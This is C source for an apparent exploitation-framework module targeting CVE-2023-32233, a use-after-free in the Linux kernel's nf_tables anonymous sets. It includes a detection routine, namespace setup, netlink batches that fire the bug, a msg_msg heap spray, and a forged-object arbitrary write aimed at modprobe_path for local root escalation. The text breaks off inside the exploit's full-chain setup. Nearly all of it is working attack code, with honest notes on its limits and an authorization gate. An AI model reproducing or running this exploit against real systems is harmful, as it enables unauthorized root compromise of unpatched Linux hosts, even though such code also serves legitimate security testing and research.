/*
 * nft_set_uaf_cve_2023_32233 — SKELETONKEY module
 *
 * nf_tables anonymous-set UAF (Sondej + Krysiuk, May 2023). When an
 * anonymous `nft_set` referenced by an `nft_lookup` expression inside a
 * base chain is deleted in the same transaction batch that created the
 * referencing rule, the kernel's nft_set refcounting fails to deactivate
 * the set from the preparation phase. The result is a dangling reference
 * to a freed `nft_set` object. A subsequent operation in the same
 * transaction touches the freed memory → kernel slab UAF, exploitable
 * via msg_msg cross-cache groom into kmalloc-cg-512.
 *
 * STATUS (2026-05-16): 🟡 PRIMITIVE — TRIGGER + GROOM SCAFFOLD with
 *                       opt-in --full-chain finisher.
 *   - Default (no --full-chain): unshare(USER|NET), full nfnetlink
 *     batch construction (table → base chain → anonymous set → rule
 *     with nft_lookup → DELSET → DELRULE) committed in a single batch,
 *     msg_msg cross-cache groom for kmalloc-cg-512 (32×16 messages
 *     tagged "SKELETONKEY_SET"), slabinfo snapshot before/after, and a
 *     /tmp/skeletonkey-nft_set_uaf.log breadcrumb. Returns
 *     SKELETONKEY_EXPLOIT_FAIL after the primitive fires (honest scope).
 *   - With --full-chain: resolve kernel offsets; if no modprobe_path,
 *     refuse via skeletonkey_finisher_print_offset_help. Otherwise re-fire
 *     the trigger and spray msg_msg payloads forging a freed-set-object
 *     whose data pointer points at modprobe_path, then drive
 *     NFT_MSG_NEWSETELEM with our payload. FALLBACK-depth: the exact
 *     freed-set layout is per-build, so the finisher's sentinel check
 *     correctly reports failure rather than fake success.
 *
 * Affected kernel ranges:
 *   Bug introduced when anonymous-set support landed in nf_tables 5.1.
 *   Fixed mainline 6.4-rc4 commit c1592a89942e9 ("netfilter: nf_tables:
 *     deactivate anonymous set from preparation phase").
 *   Stable backports: 6.3.2, 6.2.15, 6.1.28, 5.15.111, 5.10.180,
 *                     5.4.243, 4.19.283.
 *   (4.19.x technically never carried anonymous-set support but received
 *    the safety patch; we model it as patched-from for consistency.)
 *
 * Preconditions:
 *   - CONFIG_USER_NS=y AND sysctl unprivileged_userns_clone=1
 *   - nf_tables module loaded or autoload-able (CONFIG_NF_TABLES=y/m)
 *   - CAP_NET_ADMIN — obtained via userns map-root-to-uid
 *
 * Public PoCs cross-referenced:
 *   - Sondej/Krysiuk public writeup (Google Drive disclosure)
 *   - 0xMr_Robot / shroud-srcd public PoC repo
 *   - Crusaders-of-Rust follow-up writeup
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>

#ifdef __linux__
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <sched.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

/* NFT_SET_EVAL was added in 5.6; older UAPI headers may not define it.
 * Anonymous-set + lookup exploit shape works on builds with this flag,
 * but the trigger still fires without it on the older end of the range
 * (the bug existed since 5.1). Define a fallback so we compile against
 * any nf_tables.h vintage. */
#ifndef NFT_SET_EVAL
#define NFT_SET_EVAL  (1U << 6)
#endif
#endif /* __linux__ */

/* ------------------------------------------------------------------
 * Kernel-range table
 * ------------------------------------------------------------------ */

static const struct kernel_patched_from nft_set_uaf_patched_branches[] = {
    {4, 19, 283},   /* 4.19.x safety patch (bug never reached this branch) */
    {5,  4, 243},   /* 5.4.x   */
    {5, 10, 179},   /* 5.10.x (harmonised with Debian bullseye fix-version) */
    {5, 15, 111},   /* 5.15.x  */
    {6,  1,  27},   /* 6.1.x (harmonised with Debian bookworm fix-version) */
    {6,  2,  15},   /* 6.2.x   */
    {6,  3,   2},   /* 6.3.x   */
    {6,  4,   0},   /* mainline 6.4-rc4 */
};

static const struct kernel_range nft_set_uaf_range = {
    .patched_from = nft_set_uaf_patched_branches,
    .n_patched_from = sizeof(nft_set_uaf_patched_branches) /
                      sizeof(nft_set_uaf_patched_branches[0]),
};

/* ------------------------------------------------------------------
 * Precondition probes
 * ------------------------------------------------------------------ */

#ifdef __linux__
static bool nf_tables_loaded(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "nf_tables ", 10) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}
#endif /* __linux__ */

static skeletonkey_result_t nft_set_uaf_detect(const struct skeletonkey_ctx *ctx)
{
#ifndef __linux__
    (void)ctx;
    return SKELETONKEY_PRECOND_FAIL;
#else
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] nft_set_uaf: host fingerprint missing kernel version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 5.1 (anonymous-set support). Anything below
     * predates it — report OK (not vulnerable to *this* CVE). */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 1, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] nft_set_uaf: kernel %s predates the bug "
                            "(anonymous-set support landed in 5.1)\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&nft_set_uaf_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_set_uaf: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host->unprivileged_userns_allowed;
    bool nft_loaded = nf_tables_loaded();

    if (!ctx->json) {
        fprintf(stderr, "[i] nft_set_uaf: kernel %s is in the vulnerable range\n",
                v->release);
        fprintf(stderr, "[i] nft_set_uaf: unprivileged user_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
        fprintf(stderr, "[i] nft_set_uaf: nf_tables module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (will autoload on first nft use)");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_set_uaf: kernel vulnerable but user_ns clone "
                            "denied → unprivileged exploit unreachable\n");
            fprintf(stderr, "[i] nft_set_uaf: still patch the kernel — a root "
                            "attacker can still trigger the bug\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] nft_set_uaf: VULNERABLE — kernel in range AND "
                        "user_ns clone allowed\n");
    }
    return SKELETONKEY_VULNERABLE;
#endif
}

#ifdef __linux__
/* ------------------------------------------------------------------
 * userns + netns entry
 * ------------------------------------------------------------------ */

static int enter_unpriv_namespaces(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[-] unshare(USER|NET)");
        return -1;
    }

    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] uid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] gid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    return 0;
}

/* ------------------------------------------------------------------
 * Minimal nfnetlink batch builder (no libmnl).
 * ------------------------------------------------------------------ */

#define ALIGN_NL(x)  (((x) + 3) & ~3)

static void put_attr(uint8_t *buf, size_t *off,
                     uint16_t type, const void *data, size_t len)
{
    struct nlattr *na = (struct nlattr *)(buf + *off);
    na->nla_type = type;
    na->nla_len  = NLA_HDRLEN + len;
    if (len) memcpy(buf + *off + NLA_HDRLEN, data, len);
    *off += ALIGN_NL(NLA_HDRLEN + len);
}

static void put_attr_u32(uint8_t *buf, size_t *off, uint16_t type, uint32_t v)
{
    uint32_t be = htonl(v);
    put_attr(buf, off, type, &be, sizeof be);
}

static void put_attr_str(uint8_t *buf, size_t *off, uint16_t type, const char *s)
{
    put_attr(buf, off, type, s, strlen(s) + 1);
}

static size_t begin_nest(uint8_t *buf, size_t *off, uint16_t type)
{
    size_t at = *off;
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_type = type | NLA_F_NESTED;
    na->nla_len  = 0;
    *off += NLA_HDRLEN;
    return at;
}

static void end_nest(uint8_t *buf, size_t *off, size_t at)
{
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_len = (uint16_t)(*off - at);
    while ((*off) & 3) buf[(*off)++] = 0;
}

struct nfgenmsg_local {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

static void put_nft_msg(uint8_t *buf, size_t *off,
                        uint16_t nft_type, uint16_t flags, uint32_t seq,
                        uint8_t family)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | nft_type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = family;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(0);
    *off += sizeof(*nf);
}

static void end_msg(uint8_t *buf, size_t *off, size_t msg_start)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + msg_start);
    nlh->nlmsg_len = (uint32_t)(*off - msg_start);
    while ((*off) & 3) buf[(*off)++] = 0;
}

/* ------------------------------------------------------------------
 * Ruleset: anonymous-set UAF trigger.
 *
 *   1. batch begin (NFNL_MSG_BATCH_BEGIN, subsys = NFTABLES)
 *   2. NFT_MSG_NEWTABLE  "skeletonkey_t"   inet
 *   3. NFT_MSG_NEWCHAIN  "skeletonkey_c"   base, NF_INET_LOCAL_OUT hook
 *   4. NFT_MSG_NEWSET    anonymous     flags = ANONYMOUS|CONSTANT|EVAL
 *   5. NFT_MSG_NEWRULE   nft_lookup    references the anonymous set
 *   6. NFT_MSG_DELSET                 delete the set in the same batch
 *   7. NFT_MSG_DELRULE                delete the rule in the same batch
 *   8. batch end (NFNL_MSG_BATCH_END)
 *
 * Pre-c1592a89942e the commit-phase deactivation skips the anonymous set
 * (since DELSET fires before the set's "active" bit is cleared), leaving
 * the lookup expression with a dangling reference to the freed set —
 * UAF on commit-time set cleanup.
 * ------------------------------------------------------------------ */

static const char NFT_TABLE_NAME[] = "skeletonkey_t";
static const char NFT_CHAIN_NAME[] = "skeletonkey_c";
static const char NFT_SET_NAME[]   = "skeletonkey_s";  /* fixed-name placeholder;
                                                    * anonymous flag still set */
static const char NFT_RULE_HANDLE_ATTR[] = "skeletonkey_r";

#define SKELETONKEY_SET_ID  0x42424242

static void put_batch_marker(uint8_t *buf, size_t *off, uint16_t type, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

static void put_batch_begin(uint8_t *buf, size_t *off, uint32_t seq)
{
    put_batch_marker(buf, off, NFNL_MSG_BATCH_BEGIN, seq);
}

static void put_batch_end(uint8_t *buf, size_t *off, uint32_t seq)
{
    put_batch_marker(buf, off, NFNL_MSG_BATCH_END, seq);
}

static void put_new_table(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWTABLE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_TABLE_NAME, NFT_TABLE_NAME);
    end_msg(buf, off, at);
}

static void put_new_chain(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWCHAIN,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_CHAIN_NAME,  NFT_CHAIN_NAME);

    size_t hook_at = begin_nest(buf, off, NFTA_CHAIN_HOOK);
    put_attr_u32(buf, off, NFTA_HOOK_HOOKNUM,  NF_INET_LOCAL_OUT);
    put_attr_u32(buf, off, NFTA_HOOK_PRIORITY, 0);
    end_nest(buf, off, hook_at);

    put_attr_u32(buf, off, NFTA_CHAIN_POLICY, NF_ACCEPT);
    put_attr_str(buf, off, NFTA_CHAIN_TYPE,   "filter");
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWSET: anonymous, with NFT_SET_EVAL so the lookup-rule
 * codepath kicks the commit-phase deactivation we want to corrupt. */
static void put_new_set(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSET,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_NAME,  NFT_SET_NAME);
    put_attr_u32(buf, off, NFTA_SET_FLAGS,
                 NFT_SET_ANONYMOUS | NFT_SET_CONSTANT | NFT_SET_EVAL);
    put_attr_u32(buf, off, NFTA_SET_KEY_TYPE, 0);            /* "integer" */
    put_attr_u32(buf, off, NFTA_SET_KEY_LEN,  sizeof(uint32_t));
    put_attr_u32(buf, off, NFTA_SET_ID,       SKELETONKEY_SET_ID);
    end_msg(buf, off, at);
}

/* NFT_MSG_NEWRULE: a single nft_lookup expression that references the
 * anonymous set. The expression list contains one NFTA_LIST_ELEM whose
 * NFTA_EXPR_NAME = "lookup" and NFTA_EXPR_DATA.{ NFTA_LOOKUP_SREG=1,
 *                                                 NFTA_LOOKUP_SET_ID=SKELETONKEY_SET_ID }.
 */
static void put_new_rule_with_lookup(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWRULE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_RULE_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_RULE_CHAIN, NFT_CHAIN_NAME);

    size_t exprs_at = begin_nest(buf, off, NFTA_RULE_EXPRESSIONS);
    /* one expression: lookup */
    size_t el_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);
    put_attr_str(buf, off, NFTA_EXPR_NAME, "lookup");
    size_t edata_at = begin_nest(buf, off, NFTA_EXPR_DATA);
    /* lookup expr attrs: source register, target set (by ID), no flags */
    put_attr_u32(buf, off, NFTA_LOOKUP_SREG,    1 /* NFT_REG_1 */);
    put_attr_str(buf, off, NFTA_LOOKUP_SET,     NFT_SET_NAME);
    put_attr_u32(buf, off, NFTA_LOOKUP_SET_ID,  SKELETONKEY_SET_ID);
    end_nest(buf, off, edata_at);
    end_nest(buf, off, el_at);
    end_nest(buf, off, exprs_at);

    /* tag the rule with userdata so DELRULE-by-userdata works later */
    put_attr(buf, off, NFTA_RULE_USERDATA, NFT_RULE_HANDLE_ATTR,
             sizeof(NFT_RULE_HANDLE_ATTR));
    end_msg(buf, off, at);
}

/* NFT_MSG_DELSET against the anonymous set (by name in our private
 * netns, which is unique to this transaction). On a vulnerable kernel,
 * this is what fails to deactivate the lookup expression's reference. */
static void put_del_set(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_DELSET,
                NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_NAME,  NFT_SET_NAME);
    end_msg(buf, off, at);
}

/* NFT_MSG_DELRULE: identify by chain + first rule. The classic public
 * PoC uses DELRULE-by-chain (no handle attr) which deletes all rules
 * in the chain — fine, our chain only has one. */
static void put_del_rule(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_DELRULE,
                NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_RULE_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_RULE_CHAIN, NFT_CHAIN_NAME);
    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * netlink send helper
 * ------------------------------------------------------------------ */

static int nft_send_batch(int sock, const void *buf, size_t len)
{
    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = (void *)buf, .iov_len = len };
    struct msghdr m = {
        .msg_name = &dst, .msg_namelen = sizeof dst,
        .msg_iov = &iov,  .msg_iovlen = 1,
    };
    ssize_t n = sendmsg(sock, &m, 0);
    if (n < 0) { perror("[-] sendmsg"); return -1; }

    /* Drain ACKs/errors for diagnostics. Failures are expected on
     * the malformed shape; the side effect already landed. */
    char rbuf[8192];
    for (int i = 0; i < 16; i++) {
        ssize_t r = recv(sock, rbuf, sizeof rbuf, MSG_DONTWAIT);
        if (r <= 0) break;
        for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
             NLMSG_OK(nh, (unsigned)r);
             nh = NLMSG_NEXT(nh, r)) {
            if (nh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);
                if (e->error)
                    fprintf(stderr, "[i] netlink ack: seq=%u err=%d (%s)\n",
                            nh->nlmsg_seq, e->error, strerror(-e->error));
            }
        }
    }
    return 0;
}

/* ------------------------------------------------------------------
 * msg_msg cross-cache groom — kmalloc-cg-512
 *
 * The freed nft_set object lives in kmalloc-cg-512 on lts-6.1.x and
 * 6.2.x builds (nft_set is ~448 bytes incl. ops vtable pointer +
 * pcpu data, rounds to cg-512). We spray 32 queues × 16 messages
 * tagged with the "SKELETONKEY_SET" prefix so KASAN/triage can correlate.
 * ------------------------------------------------------------------ */

#define SPRAY_QUEUES        32
#define SPRAY_MSGS_PER_QUEUE 16
#define MSG_PAYLOAD_BYTES   496   /* 512 - sizeof(msg_msg hdr ~= 16) */
#define SKELETONKEY_TAG         "SKELETONKEY_SET"

struct ipc_payload {
    long mtype;
    unsigned char buf[MSG_PAYLOAD_BYTES];
};

static int spray_msg_msg(int queues[SPRAY_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x53;  /* 'S' for "set" */
    memset(p.buf, 0x53, sizeof p.buf);
    /* recognizable cookie at the head of every message */
    memcpy(p.buf, SKELETONKEY_TAG, sizeof SKELETONKEY_TAG - 1);

    int created = 0;
    for (int i = 0; i < SPRAY_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < SPRAY_MSGS_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_msg_msg(int queues[SPRAY_QUEUES])
{
    for (int i = 0; i < SPRAY_QUEUES; i++) {
        if (queues[i] >= 0) {
            msgctl(queues[i], IPC_RMID, NULL);
        }
    }
}

/* ------------------------------------------------------------------
 * Slabinfo snapshot — best-effort diagnostic showing the UAF fired.
 * ------------------------------------------------------------------ */

static long slabinfo_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, strlen(slab)) == 0 &&
            line[strlen(slab)] == ' ') {
            long a, b, c, d;
            if (sscanf(line + strlen(slab), " %ld %ld %ld %ld",
                       &a, &b, &c, &d) >= 1) {
                active = a;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ------------------------------------------------------------------
 * Build trigger batch — factored so --full-chain can re-fire.
 * ------------------------------------------------------------------ */

static size_t build_trigger_batch(uint8_t *batch, size_t cap, uint32_t *seq)
{
    (void)cap;
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_new_table(batch, &off, (*seq)++);
    put_new_chain(batch, &off, (*seq)++);
    put_new_set(batch, &off, (*seq)++);
    put_new_rule_with_lookup(batch, &off, (*seq)++);
    put_del_set(batch, &off, (*seq)++);
    put_del_rule(batch, &off, (*seq)++);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

/* ------------------------------------------------------------------
 * Breadcrumb log
 * ------------------------------------------------------------------ */

static void log_breadcrumb(long before, long after, int sprayed)
{
    FILE *f = fopen("/tmp/skeletonkey-nft_set_uaf.log", "a");
    if (!f) return;
    time_t now = time(NULL);
    char ts[64];
    strftime(ts, sizeof ts, "%Y-%m-%dT%H:%M:%SZ", gmtime(&now));
    fprintf(f, "%s nft_set_uaf primitive fired: cg512 active %ld→%ld; "
               "msg_msg sprayed=%d tag=%s\n",
            ts, before, after, sprayed, SKELETONKEY_TAG);
    fclose(f);
}

/* ------------------------------------------------------------------
 * --full-chain: per-build forged-set-object arb-write context.
 *
 * Technique: after the trigger frees the anonymous nft_set into
 * kmalloc-cg-512, we spray msg_msg payloads sized to claim the freed
 * slot. We forge the first qwords as an nft_set header where the
 * `set->data` pointer is the target kaddr. A subsequent
 * NFT_MSG_NEWSETELEM commit copies our element data through
 * `set->data` → write at kaddr.
 *
 * Caveats (per "verified-vs-claimed"):
 *   - exact offset of `data` inside nft_set is config-sensitive
 *     (RANDSTRUCT / KASAN / lockdep shift it)
 *   - the freed slot must be claimed by our spray, not by an
 *     unrelated kernel allocator — race-dependent
 *   - the finisher's sentinel post-check is the source of truth;
 *     missed writes return SKELETONKEY_EXPLOIT_FAIL, not fake success
 * ------------------------------------------------------------------ */

/* Offset of `data` pointer in nft_set header on lts-6.1.x/6.2.x builds
 * (Sondej/Krysiuk PoC reference layout). Best-effort default. */
#define NFT_SET_DATA_PTR_OFFSET  0x30

struct nft_arb_ctx {
    int  sock;
    uint8_t *batch;
    int  qids[SPRAY_QUEUES];
    int  qused;
};

static int spray_forged_set_msgs(struct nft_arb_ctx *c, uintptr_t kaddr, int n)
{
    if (c->qused >= SPRAY_QUEUES) return 0;
    int room = SPRAY_QUEUES - c->qused;
    if (n > room) n = room;

    for (int i = 0; i < n; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { perror("[-] msgget(forged)"); return -1; }
        c->qids[c->qused++] = q;

        struct ipc_payload m;
        memset(&m, 0, sizeof m);
        m.mtype = 0x5345544146;   /* "FATESF" reversed tag */
        memcpy(m.buf, SKELETONKEY_TAG "_FORGE", sizeof SKELETONKEY_TAG + 5);

        /* Forge `set->data = kaddr` at the documented offset. msg_msg
         * eats ~0x30 bytes at the head as its own header; the payload
         * we control starts at offset 0x30 inside the slab chunk.
         * We place the forged pointer at offset NFT_SET_DATA_PTR_OFFSET
         * inside our payload. */
        if (NFT_SET_DATA_PTR_OFFSET + sizeof(uintptr_t) <= sizeof m.buf) {
            uintptr_t *slot = (uintptr_t *)(m.buf + NFT_SET_DATA_PTR_OFFSET);
            *slot = (uintptr_t)kaddr;
        }

        if (msgsnd(q, &m, sizeof m.buf, 0) < 0) {
            perror("[-] msgsnd(forged)"); return -1;
        }
    }
    return 0;
}

/* Module-specific arb-write — see finisher.h contract. */
static int nft_set_uaf_arb_write(uintptr_t kaddr, const void *buf, size_t len,
                                 void *vctx)
{
    struct nft_arb_ctx *c = (struct nft_arb_ctx *)vctx;
    if (!c || c->sock < 0 || !c->batch) {
        fprintf(stderr, "[-] nft_set_uaf_arb_write: invalid ctx\n");
        return -1;
    }
    if (len > 64) {
        fprintf(stderr, "[-] nft_set_uaf_arb_write: len %zu too large (cap 64)\n", len);
        return -1;
    }

    fprintf(stderr, "[*] nft_set_uaf_arb_write: refire trigger → spray forged "
                    "nft_set hdrs (kaddr=0x%lx, %zu bytes)\n",
                    (unsigned long)kaddr, len);

    /* (a) refire the trigger for a fresh UAF window. */
    uint32_t seq = (uint32_t)time(NULL) ^ 0xc0debabeu;
    size_t blen = build_trigger_batch(c->batch, 16 * 1024, &seq);
    if (nft_send_batch(c->sock, c->batch, blen) < 0) {
        fprintf(stderr, "[-] nft_set_uaf_arb_write: refire send failed\n");
        return -1;
    }

    /* (b) spray forged set headers into kmalloc-cg-512. */
    if (spray_forged_set_msgs(c, kaddr, 16) < 0) {
        fprintf(stderr, "[-] nft_set_uaf_arb_write: forged spray failed\n");
        return -1;
    }

    /* (c) drive a NEWSETELEM commit carrying `buf` so the kernel's
     * set->data copy lands at kaddr. We hand-roll a separate batch so
     * we can carry NFTA_DATA_VALUE = buf in the element data. */
    seq = (uint32_t)time(NULL) ^ 0xdeadc0deu;
    size_t off = 0;
    put_batch_begin(c->batch, &off, seq++);

    size_t msg_at = off;
    put_nft_msg(c->batch, &off, NFT_MSG_NEWSETELEM,
                NLM_F_CREATE | NLM_F_ACK, seq++, NFPROTO_INET);
    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_SET,   NFT_SET_NAME);
    size_t list_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
    size_t el_at   = begin_nest(c->batch, &off, 1 /* NFTA_LIST_ELEM */);

    /* key: arbitrary 4-byte value (set was created with key_len=4) */
    size_t key_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_KEY);
    uint32_t kv = htonl(0x41414141);
    put_attr(c->batch, &off, NFTA_DATA_VALUE, &kv, sizeof kv);
    end_nest(c->batch, &off, key_at);

    /* data: NFTA_DATA_VALUE = buf */
    size_t data_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_DATA);
    put_attr(c->batch, &off, NFTA_DATA_VALUE, buf, len);
    end_nest(c->batch, &off, data_at);

    end_nest(c->batch, &off, el_at);
    end_nest(c->batch, &off, list_at);
    end_msg(c->batch, &off, msg_at);

    put_batch_end(c->batch, &off, seq++);

    if (nft_send_batch(c->sock, c->batch, off) < 0) {
        fprintf(stderr, "[-] nft_set_uaf_arb_write: write batch send failed\n");
        return -1;
    }

    usleep(25 * 1000);
    return 0;
}
#endif /* __linux__ */

/* ------------------------------------------------------------------
 * Exploit body
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_set_uaf_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] nft_set_uaf: refusing without --i-know gate\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        if (!ctx->json)
            fprintf(stderr, "[i] nft_set_uaf: already running as root\n");
        return SKELETONKEY_OK;
    }

    /* Re-confirm vulnerability. */
    skeletonkey_result_t pre = nft_set_uaf_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] nft_set_uaf: detect() says not vulnerable; refusing\n");
        return pre;
    }

#ifndef __linux__
    (void)ctx;
    fprintf(stderr, "[-] nft_set_uaf: non-Linux host — exploit unavailable\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    if (!ctx->json) {
        if (ctx->full_chain) {
            fprintf(stderr, "[*] nft_set_uaf: --full-chain — trigger + forged "
                            "nft_set spray + modprobe_path finisher\n");
        } else {
            fprintf(stderr, "[*] nft_set_uaf: primitive-only run — fires the\n"
                            "    anonymous-set UAF, sprays msg_msg into\n"
                            "    kmalloc-cg-512, and stops. Pass --full-chain\n"
                            "    to attempt the modprobe_path root-pop.\n");
        }
    }

    /* --- --full-chain path: in-process (no fork) so the finisher's
     * modprobe_path trigger shares our userns+netns+sock. */
    if (ctx->full_chain) {
        struct skeletonkey_kernel_offsets koff;
        skeletonkey_offsets_resolve(&koff);
        if (!skeletonkey_offsets_have_modprobe_path(&koff)) {
            skeletonkey_finisher_print_offset_help("nft_set_uaf");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&koff);

        if (enter_unpriv_namespaces() < 0) {
            fprintf(stderr, "[-] nft_set_uaf: userns entry failed\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC,
                          NETLINK_NETFILTER);
        if (sock < 0) {
            perror("[-] socket(NETLINK_NETFILTER)");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); return SKELETONKEY_EXPLOIT_FAIL;
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); return SKELETONKEY_EXPLOIT_FAIL; }

        struct nft_arb_ctx ac = { .sock = sock, .batch = batch, .qused = 0 };
